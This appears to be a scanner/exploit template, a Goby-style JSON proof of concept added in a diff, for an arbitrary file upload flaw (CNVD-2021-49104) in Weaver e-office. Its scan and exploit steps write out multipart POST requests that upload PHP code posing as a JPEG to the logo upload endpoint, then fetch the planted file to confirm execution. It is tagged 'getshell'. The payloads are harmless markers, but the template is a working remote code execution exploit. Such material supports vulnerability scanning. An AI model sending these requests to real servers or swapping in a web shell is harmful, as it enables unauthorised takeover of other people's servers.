@@ -1,0 +1,138 @@
+{
+      "Name": "Weaver EOffice Arbitrary File Upload CNVD-2021-49104",
+      "Level": "3",
+      "Tags": [
+            "getshell"
+      ],
+      "GobyQuery": "app=\"泛微-EOffice\" || app=\"EOffice\"",
+      "Description": "Weaver e-office is a standard collaborative mobile office platform under Weaver.",
+      "Product": "Weaver EOffice",
+      "Homepage": "https://weaver.com/",
+      "Author": "",
+      "Impact": "There is a file upload vulnerability in Weaver&nbsp;e-office, which can be exploited by attackers to gain control over the server.",
+      "Recommendation": "http://v10.e-office.cn/eoffice9update/safepack.zip",
+      "References": [
+            "https://chowdera.com/2021/12/202112200602130067.html",
+            "https://mp.weixin.qq.com/s?__biz=MzIxNTIzNTExMQ==&mid=2247486095&idx=1&sn=950550f05795d6ae64842a2f3a5b0eca"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+                        },
+                        "data_type": "text",
+                        "data": "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nprint \"test\";\r\n?>\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "logo-eoffice.php",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|define||访问"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/images/logo/logo-eoffice.php",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+                        },
+                        "data_type": "text",
+                        "data": "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test1.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nphpinfo();\r\n?>\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "logo-eoffice.php",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|define||/images/logo/logo-eoffice.php"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
